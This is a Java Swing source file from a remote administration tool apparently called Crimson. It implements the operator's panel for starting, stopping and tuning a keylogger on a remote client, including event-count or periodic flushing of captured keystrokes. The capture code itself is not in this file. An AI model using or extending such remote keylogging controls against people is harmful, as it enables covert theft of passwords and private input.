/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.viewer.ui.screen.controlpanels.client.keylogger.ep;

import java.awt.Dimension;
import java.awt.Font;
import java.awt.Insets;
import java.util.concurrent.ExecutionException;

import javax.swing.DefaultComboBoxModel;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.SwingWorker;
import javax.swing.border.EtchedBorder;

import com.subterranean_security.crimson.core.util.ValidationUtil;
import com.subterranean_security.crimson.proto.core.Misc.Outcome;
import com.subterranean_security.crimson.proto.core.net.sequences.ClientControl.RQ_ChangeSetting;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.State;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.Trigger;
import com.subterranean_security.crimson.viewer.net.ViewerCommands;
import com.subterranean_security.crimson.viewer.ui.common.components.labels.StatusLabel;

public class Settings extends JPanel {

	private static final long serialVersionUID = 1L;
	private JTextField textField;

	private String[] methodStrings = new String[] { "Event", "Periodic" };
	private String eventDescription = "Keylogger flushes will be triggered after the specified number of key events.";
	private String timeDescription = "Keylogger flushes will be triggered periodically. Period must be at least 1 second.";
	private JTextArea textArea;
	private JLabel lblRefreshValue;

	private int cid;
	private boolean keyloggerStatus;
	private Trigger trigger;
	private int flushValue;
	private JComboBox<String> comboBox;
	private JButton btnStart;
	private StatusLabel sl;
	private JLabel lblUnits;

	public Settings(int cid, State state, Trigger method, int flushValue) {
		System.out.println("Settings EP. State: " + state + " Trigger: " + method);
		this.cid = cid;
		this.keyloggerStatus = (state == State.ONLINE);
		this.trigger = method;
		this.flushValue = (flushValue == 0) ? 60 : flushValue;
		init();

		refreshFlushMethod();
		refreshStatus();
		comboBox.setSelectedItem(methodStrings[method.ordinal()]);
	}

	public void save() {
		new Thread(new Runnable() {
			public void run() {
				RQ_ChangeSetting.Builder rq = RQ_ChangeSetting.newBuilder();
				if (getMethod() != trigger) {
					rq.setFlushMethod(getMethod());
				}

				if (ValidationUtil.keyloggerFlushNumber(textField.getText())
						&& flushValue != Integer.parseInt(textField.getText())) {
					rq.setFlushValue(Integer.parseInt(textField.getText()));
				}

				if (rq.hasFlushMethod() || rq.hasFlushValue()) {
					ViewerCommands.changeSetting(cid, rq.build());
				}
			}
		}).start();

	}

	public void init() {

		JPanel panel = new JPanel();
		panel.setBorder(new EtchedBorder(EtchedBorder.LOWERED, null, null));
		panel.setPreferredSize(new Dimension(281, 125));
		add(panel);
		panel.setLayout(null);

		JLabel lblRefreshMethod = new JLabel("Flush Trigger:");
		lblRefreshMethod.setFont(new Font("Dialog", Font.BOLD, 10));
		lblRefreshMethod.setBounds(12, 71, 117, 19);
		panel.add(lblRefreshMethod);

		lblRefreshValue = new JLabel("Event Threshold:");
		lblRefreshValue.setFont(new Font("Dialog", Font.BOLD, 10));
		lblRefreshValue.setBounds(12, 97, 117, 19);
		panel.add(lblRefreshValue);

		comboBox = new JComboBox<String>();
		comboBox.addActionListener(e -> refreshFlushMethod());
		comboBox.setFont(new Font("Dialog", Font.BOLD, 10));
		comboBox.setModel(new DefaultComboBoxModel<String>(methodStrings));
		comboBox.setBounds(182, 71, 87, 19);
		panel.add(comboBox);

		textField = new JTextField();
		textField.setFont(new Font("Dialog", Font.PLAIN, 10));
		textField.setText("" + flushValue);
		textField.setBounds(181, 97, 36, 19);
		panel.add(textField);
		textField.setColumns(10);

		JLabel lblKeyloggerStatus = new JLabel("Keylogger Status:");
		lblKeyloggerStatus.setFont(new Font("Dialog", Font.BOLD, 10));
		lblKeyloggerStatus.setBounds(12, 46, 117, 19);
		panel.add(lblKeyloggerStatus);

		btnStart = new JButton();
		btnStart.addActionListener(e -> {
			btnStart.setEnabled(false);
			sl.setInfo("loading...");

			new SwingWorker<Outcome, Void>() {
				@Override
				protected Outcome doInBackground() throws Exception {
					return ViewerCommands.changeSetting(cid, RQ_ChangeSetting.newBuilder()
							.setKeyloggerState(keyloggerStatus ? State.OFFLINE : State.ONLINE).build());
				}

				protected void done() {
					try {
						Outcome outcome = get();
						if (outcome.getResult()) {
							keyloggerStatus = !keyloggerStatus;
						}
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					} catch (ExecutionException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

					refreshStatus();
					btnStart.setEnabled(true);
				};
			}.execute();

		});
		btnStart.setMargin(new Insets(2, 4, 2, 4));
		btnStart.setFont(new Font("Dialog", Font.BOLD, 10));
		btnStart.setBounds(216, 46, 53, 19);
		panel.add(btnStart);

		sl = new StatusLabel();
		sl.setBounds(141, 47, 66, 17);
		panel.add(sl);

		textArea = new JTextArea();
		textArea.setFont(new Font("Dialog", Font.BOLD, 10));
		textArea.setBorder(new EtchedBorder(EtchedBorder.LOWERED, null, null));
		textArea.setWrapStyleWord(true);
		textArea.setOpaque(false);
		textArea.setLineWrap(true);
		textArea.setEditable(false);
		textArea.setBounds(12, 6, 257, 34);
		panel.add(textArea);

		lblUnits = new JLabel("seconds");
		lblUnits.setFont(new Font("Dialog", Font.BOLD, 10));
		lblUnits.setBounds(223, 97, 46, 19);
		panel.add(lblUnits);

	}

	private Trigger getMethod() {
		if (((String) comboBox.getSelectedItem()).equals(methodStrings[0])) {
			return Trigger.EVENT;
		} else {
			return Trigger.PERIODIC;
		}
	}

	private void refreshFlushMethod() {
		if (((String) comboBox.getSelectedItem()).equals(methodStrings[0])) {
			textArea.setText(eventDescription);
			lblRefreshValue.setText("Event Threshold:");
			lblUnits.setText("events");
		} else {
			textArea.setText(timeDescription);
			lblRefreshValue.setText("Refresh Period:");
			lblUnits.setText("seconds");
		}
	}

	private void refreshStatus() {
		if (keyloggerStatus) {
			sl.setGood("running");
			btnStart.setText("Stop");
		} else {
			sl.setBad("stopped");
			btnStart.setText("Start");
		}
	}
}
